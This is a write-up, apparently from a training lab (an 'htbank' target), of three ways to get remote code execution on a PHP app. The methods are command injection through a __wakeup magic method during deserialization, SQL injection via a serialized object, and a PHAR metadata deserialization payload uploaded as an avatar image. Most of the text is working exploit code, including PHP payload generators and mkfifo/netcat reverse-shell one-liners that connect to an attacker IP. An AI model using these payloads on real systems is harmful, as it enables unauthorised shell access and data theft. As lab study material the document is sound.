**PHP RCE**
In this last step we will perform a RCE over the PHP deserialization... 

# First Method via Magic Methods:
In this method we found from the source code the presence of some magic methods(used by the interpreter to perform specifical actions when ivoked on an object) into **app/Helpers/UserSettings.php**

1)We can identify that the magic method "wakeup" that performs a shell_exec that verbose a date into logfile:
```
public function __wakeup() {
    shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
}
(__wakeup() = method called by interpreter when a de-serialization is performed)
```

2)Knowing that the date is performed we could send something similar and gain rce(OBS: we added " to close the quotation; command; # commenting to avoid issues.) `<<"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;>>`

```
<?php
include('UserSettings.php');
echo base64_encode(serialize(new \App\Helpers\UserSettings('";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.192 5555 >/tmp/f;#', 'attacker@htbank.com', '$2y$10$svWJFDtVfcCMidHBZN9Bee1gx7MkA/F5fglf8K64htZOrC3edyJCG', 'default.jpg')));
?>
```

3)Import the config and upon refresh on /settings should be able to get a NC shell.

# Second Method via SQLi:
We found that the SQL used in the back-end fetches the id from a HTTP request and no sanitization is peformed:

```
class UserModel {
    function __construct($id) {
        $this->id = $id;
    }
class UserProperty {
    function __construct($id, $prop) {
        $this->id = $id;
        $this->prop = $prop;
        $u = new UserModel($id);
        $this->val = $u->$prop;
    }
```


This can be used likewise to perform a SQLi:
```
$up = new UserProperty(1, "group_concat(table_name) from information_schema.tables where table_schema='htbank';-- ");
echo POST_Check_User_Property(serialize($up));
```


# Third Method via PHAR Deserialization:
In this third example method we see that the avatar picture seems lacking a back-end format validation and only saved the file like randomMD%.jpg under: `http://SERVER_IP:8000/uploads/<MD5>.jpg`

```
...
if (!empty($request["profile_pic"])) {
  $file = $request->file('profile_pic');
  $fname = md5(random_bytes(20));
  $file->move('uploads',"$fname.jpg");
  $user->profile_pic = "uploads/$fname.jpg";
}
...


```

## Attack Scenario
Here the culprit to use **phar://** which is basically a way to archive whole php app as would be JAR archives for Java. Whenever a phar:// is called the metadata will be deserialized by default except for
**PHP 7.x= deserialization occurs by default**
**PHP 8.x= not working our of the box and in php.ini (phar.readonly = Off)**

1)Generate a exploit.php that creates a malicious phar file:
```
<?php
include('UserSettings.php');
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.192 6666 >/tmp/f;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));
$phar->stopBuffering();
?>
```


2)Take the **exploit.phar** from step 2 and upload it as avatar pic
3)Right click on the picture and copy the address!
4) Run **phar://LINKFROMSTEP3** to read **exploit.phar** metadata and invoke a de-serialization -> RCE!
http://10.129.143.235:8000/image?=phar://uploads/03c04c50dbb7f117c7cc3ba0301a2bbb.jpg
